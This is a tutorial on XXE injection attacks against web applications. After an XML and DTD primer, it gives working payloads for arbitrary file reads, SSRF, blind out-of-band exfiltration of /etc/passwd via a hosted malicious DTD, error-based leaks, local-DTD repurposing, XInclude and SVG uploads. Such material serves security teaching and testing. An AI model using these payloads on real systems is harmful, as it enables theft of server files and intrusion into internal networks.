# XXE Injection

> **XXE Injection** is a web application security vulnerability which allows malicious attackers to interfere with XML parsing of the web application, typically resulting in the access to the contents of arbitrary files on the system, perform a DOS attack, enumerate internal systems and much more.

XEE Injection arises because of the potential dangerous features that XML parser provides. The features though not needed, might be enabled in the web application, which results in the injection to become successful.

## XML Introduction

XML or _Extensible Markup Language_ is a type of markup language that provides a set of rules for encoding a document that can be read by both humans and machines. The main aspect of XML is to provide ability for inter-communication between machines.

For Example,

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
  </person>
```

The above XML file defines a simple set of data enclosed in opening and closing tags.

### DTD

> Document Type Definition also know as DTD is a set of declarations that define the structure of a XML document.

Example,

```xml
  <?xml version="1.0"?>
  <!DOCTYPE person [
    <!ELEMENT person (firstname, lastname, age)>
    <!ELEMENT firstname (#PCDATA)>
    <!ELEMENT lastname (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
  ]>
  <person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
  </person>
```

In the above example,

- `!DOCTYPE person` defines that root element should be `person`.
- `!ELEMENT person` defines that `person` element must have `firstname`, `lastname` and `age` as it's children.
- `!ELEMENT firstname` defines that `firstname` should be of `#PCDATA` type.
- `!ELEMENT lastname` defines that `lastname` should be of `#PCDATA` type.
- `!ELEMENT age` defines that `age` should be of `#PCDATA` type.

Following the above DTD rules we have,

```xml
<person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
 </person>
```

### External DTD

> DTD can be referenced through external files using SYSTEM keyword.

Example,

```xml
<?xml version="1.0"?>
<!DOCTYPE person SYSTEM "person.dtd">
<person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
 </person>
```

The `SYSTEM` keyword is responsible for external references.
Now `person.dtd` will have,

```xml
  <!ELEMENT person (firstname, lastname, age)>
  <!ELEMENT firstname (#PCDATA)>
  <!ELEMENT lastname (#PCDATA)>
  <!ELEMENT age (#PCDATA)>
```

### XML Custom Entities

XML Custom entities enables to reference a user-defined entity in a DTD.

Example,

```xml
  <!DOCTYPE person [
  <!ELEMENT person (#PCDATA) >
  <!ENTITY name "John Doe">
  ]>
  <person>
    &name;
  </person>
```

The `&name;` would then be replace by `John Doe` because it's a custom entity defined in DTD.

## Exploiting XXE Injection

There are numerous XXE attacks but we will mainly focus few of them.

### Reading Arbitrary files using XXE Injection

To be able to read arbitrary files we need to do two things,

1. Insert or modify an external entity that will reference our arbitrary file.
2. Use the defined _external_ entity in the XML that gets returned with the application's response along with the contents of the arbitrary file.

Let's say you went to an e-commerce website and you found out that their search functionality uses **XML** in their POST data to send search term to the backend.

POST Request sample,

```post
POST /search/ HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 107
DNT: 1
Connection: close

<?xml version="1.0" encoding="UTF-8"?><term>Cars</term>
```

To retrieve contents of file at `/etc/hostname` we first define an external entity as,

```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
```

and then, we use the external entity in the XML that will get returned as response to our request.

```xml
  <term>&xxe;</term>
```

Now our full XEE payload will become,

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
  <term>&xxe;</term>
```

Voila! The response we get is,

```post
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1187

No results for "MY_COMPUTER."
```

Enclosed between the quotes is our contents of `/etc/hostname`. Just replace `/etc/hostname` with any file name to retrieve it's contents.

### Performing SSRF using XXE Injection

It is possible to perform **SSRF** using XXE Injection.

In our previous example we used XXE to read contents of file `/ect/hostname` using DTD of,

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
```

Now to perform a SSRF using the same entity, we would just replace the URI with an external URL.

```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-website.com'>]>
```

Now our payload becomes,

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-website.com'>]>
  <term>&xxe;</term>
```

Now, as a response to the above request, we will receive anything that gets returned from `https://my-website.com`.

#### Impact

This payload can make the vulnerable server work as a proxy for routing web requests. A malicious actor will utilize this proxy to deliver malware and perform nefarious activities.

This will also let the attacker enumerate the internal network that the compromised server has access to.
Not just that, by making the internal server ping our own server we can log the traffic and get additional data regarding the server.
Basically, this is a critical vulnerability and should be fixed immediately.

## Blind XXE Injection

**Blind XXE Injection** is an injection vulnerability where the results of an XXE Injection is not returned in the response, by the application.

The vulnerability is complex as compared to other XXE vulnerabilities.

### Finding Blind XXE Injection using Out-Of-Band techniques

> Out-of-band technique involves the attacker to setup a remote server, that they control and listen for any **intentional network requests** which confirms that the exploit was successful.

Finding **Blind XXE Injection** is similar to **SSRF** using **XXE injection**.

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-targetsite.com'> &xxe;]>
```

In the above payload we create a XML external entity whose contents are gathered from our URL. Then, we immediately use the external entity which causes the parser to evaluate the URL by sending a HTTP request.

If the payload was successful we should see a HTTP GET request sent by the webserver.

> In some cases using the regular entities are blocked by the parser in that situation, we could use XML parameter entities.

XML parameter entities are declared using the following syntax,

```xml
<!ENTITY % entity-name "ENTITY VALUE HERE" >
```

`entity-name` is the name of the entity and `ENTITY VALUE HERE` is the value of the entity.

They are reference using `%entity-name` in DTD.

### Using XML Parameter Entity for exploiting using Out-Of-Band

The previous piece of code using XML parameter entity will become,

```xml
  <?xml version="1.0" encoding="UTF-8">
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://my-targetsite.com"> %xxe;]>
```

This would also result in a HTTP request from the webserver to `https://my-targetsite.com`.

### Exfiltrate sensitive data using Blind XXE Injection

It is possible to exfiltrate sensitive data through Blind XXE Injection by using a technique we are going to discuss now.

We need to do two things to exfiltrate data using blind XXE injection,

1. First, we need to host a malicious DTD file that will take the _sensitive_ file's contents and then, send the contents of the file in a HTTP GET request to our remote server.
2. Second, we need to inject an external XML parameter entity into the vulnerable webserver that will refer to our malicious DTD stored in our site and use it.

The malicious DTD in our site will be,

```xml
  <!ENTITY % file SYSTEM '/etc/passwd'>
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://target.site.com/?file=%file;'>">
  %eval;
  %exfiltrate;
```

The DTD will carry out these tasks,

1. Creates a XML **parameter** entity with the name of `file` that contains the contents of file `/etc/passwd`.
2. Creates another XML parameter entity `eval`, that contains _dynamic declaration_ of another XML parameter entity called `exfiltrate`. Now, the `exfiltrate` will be evaluated by making a HTTP request to `https://target.site.com/?file=%file;` where `%file;` will be replaced with the contents of `file`, i.e. the contents of `/etc/passwd`.
3. `eval` parameter entity is used, which causes dynamic declaration of `exfiltrate`.
4. At last, `exfiltrate` is used that gets **evaluated** by sending a HTTP request to the server `https://target.site.com/?file=%file;` with the contents of `file` in the HTTP GET request parameter.

The XML external entity that will trigger all these DTD actions must be sent to the vulnerable webserver.

```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
```

The above external entity will get our malicious DTD available at `https://target.site.com/malicious.dtd` and then, evaluate it because, `xxe` is used in the end.

If all ran successfully we should see a HTTP GET request with the contents of `/etc/passwd` in the request parameter.

> **Note:** The reason for using external DTD **stored in our server** is because, as per XML specification, defining an external parameter entity inside another parameter entity is not allowed in internal DTD but allowed in external DTD. Although some parsers might allow but, most of them don't.

### Exfiltrate data using Blind XXE Injection through error messages

In some cases, you might be able to exfiltrate data using error messages that gets returned from the webserver.

For example, if you try to refer a XML external entity to some non-existent file, you will receive an error message with the filename in it. If the server sends the error message with the response then, we can exfiltrate data with it.

To be able to use this technique we need two things,

1. First, we need to host an external DTD that will _throw an XML error intentionally_ and the error message **must include** the data that we want to exfiltrate.
2. Second, an external entity must be sent to the vulnerable webserver which will load the external DTD file from our server and then, use it.

The malicious XML DTD will look something like this,

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///bla/bla/%file;'>">
%eval;
%error;
```

The DTD will,

1. Create an external XML entity `file`, that will contain the contents of file `/etc/hostname`.
2. Create another external entity `eval`, that will declare a _dynamic external entity_ `error`.
3. Next, `file` is evaluated with contents from file `/etc/hostname`.
4. When `eval` gets evaluated, a new _XML external entity_ `error` gets declared with reference to the file `/bla/bla/%file;`. Here, `%file;` get replaced with contents of `file` entity. If file `/etc/hostname` contains `WyvernDrexx` then, `file` entity will have `WyvernDrexx` so, the `error` entity will refer to the file: `/bla/bla/WyvernDrexx`.
5. At last, since file `/bla/bla/WyvernDrexx` doesn't exist so the **XML parser** fails to evaluate `error` and throws an error similar to, `Error: File '/bla/bla/WyvernDrexx;' does not exist.`. Now, from the error message we can extract the hostname of the server.

The DTD sent to the server that will trigger the malicious DTD will be,

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
```

We can exfiltrate any data using this technique as long as the error messages are shown.

### Exfiltrate sensitive data by modifying an existing entity of external DTD

Till now the way we exploited blind XXE Injection was using **Out-Of-Band** techniques where, a malicious DTD was loaded from our site and used.

> **Note:** The reason for using external DTD **stored in our server** is because, as per XML specification, defining an external parameter entity inside another parameter entity is not allowed in internal DTD but allowed in external DTD. Although some parsers might allow but, most of them don't.

What if, **Out-of-Band** connections are blocked? It means we cannot load external DTD from our own server and exploit it. In that case, we can trigger an error containing sensitive data by _modifying an existing entity and then, triggering an error._

> Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in the top 10 web hacking techniques of 2018.\
> _Source: PortSwigger Web Academy_

In order for this technique to work we need a DTD file that is available on the filesystem. We can search Google for common DTD files and get a list of it.

Let's say theres a DTD file `/usr/share/yelp/dtd/dockbookx.dtd` in the filesystem.
Now, our payload would be,

```xml
<!DOCTYPE exploit [
<!ENTITY % external_dtd SYSTEM "file:///usr/share/yelp/dtd/dockbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%external_dtd;
]>
```

The above payload looks similar to our previous payload with some major differences,

1. We first load `external_dtd` which gets DTD from the file on the system, `/usr/share/yelp/dtd/dockbookx.dtd`.
2. After loading the external entity `external_dtd`, we then **repurpose** an **existing** entity. `ISOamso` is an entity defined on the DTD `/usr/share/yelp/dtd/dockbookx.dtd`.
3. We repurpose `ISOamso` to create a dynamic declaration of external entity that creates another external entity.
4. When `ISOamso` is evaluated we get an error which is exactly same as our previous exploit.
5. At last, on our DTD we use the `external_dtd` that will evaluate it's entity including our repurposed entity `ISOamso` which in turn, triggers the error.

## XXE Injection with XInclude

Not all applications would send XML document from client to server. Many of them send data in text form, from client to server then, embed it into an XML document and parse it.

For example, a web application would submit a form through POST data and later, extract the form data and embed them in a XML document. In that case, we cannot use our techniques discussed above because, we don't have access to full XML Document.

XML provides a feature that allows us to include a **sub-document** inside a XML Document using **XInclude**.
To include a sub-document using **XInclude** we use

```xml
<?xml version="1.0"?>
<article>
    <title>Hello</title>
    <para>World</para>
    <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="helloworld.xml"></xi:include>
</article>
```

1. `xi:include` specifies that the included content will replace this tag.
2. `href` is used to refer to the **XML Sub Document** that will replace the `xi:include`.

> **Note:** The **XInclude** expects the sub-document to be a valid XML document so in-order to include a _non-XML document_ we need to provide an additional attribute `parse=text` along with `href`.

Hence now, our payload becomes,

```xml
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"></xi:include>
```

Replace any value on a body with the payload. Make sure the value you are replacing will be reflected in the response to that request.

## XXE Injection using SVG File Upload

Most of the website provide you with the ability to upload images in form of _profile picture_, _avatar_ or inside posts.
Most of them would be in the form of `.jpg` or '.png' but, some of the image processing libraries support **SVG** file.

> _Scalable Vector Graphics (SVG) is an Extensible Markup Language (XML)-based vector image format for two-dimensional graphics with support for interactivity and animation. The SVG specification is an open standard developed by the World Wide Web Consortium (W3C) since 1999._\Source: Wikipedia

It is possible to get sensitive data using SVG files.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

The above SVG file defines a **DTD** with XML external entity `xxe` that has contents from `/etc/hostname`. Now, inside `svg` we define a `text` tag that will contain the contents of `xxe` in our case contents of `/etc/hostname`.

We need to save the file with `.svg` extension and upload in the vulnerable webserver. If, you can see the SVG image that gets uploaded then, you will realize that the SVG is filled with the contents of file `/etc/hostname`.
